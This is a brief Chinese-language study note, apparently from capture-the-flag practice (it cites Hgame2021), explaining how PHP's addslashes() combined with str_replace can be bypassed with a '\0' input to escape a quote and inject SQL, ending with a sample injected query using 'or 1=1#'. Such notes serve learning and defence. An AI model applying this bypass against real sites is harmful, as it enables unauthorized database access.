PHP addslashes() 函数

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：

  • 单引号（’）
  • 双引号（”）
  • 反斜杠（\）
  • NULL

'会被转义掉，但配合str_replace就可以产生一些奇妙的变化

?id=\0：

这样就可以传入一个转义符号，类似Hgame2021的jali，转义掉一个'，注释掉一个'来注入

select * from images where id='\' or path='or 1=1#'=>
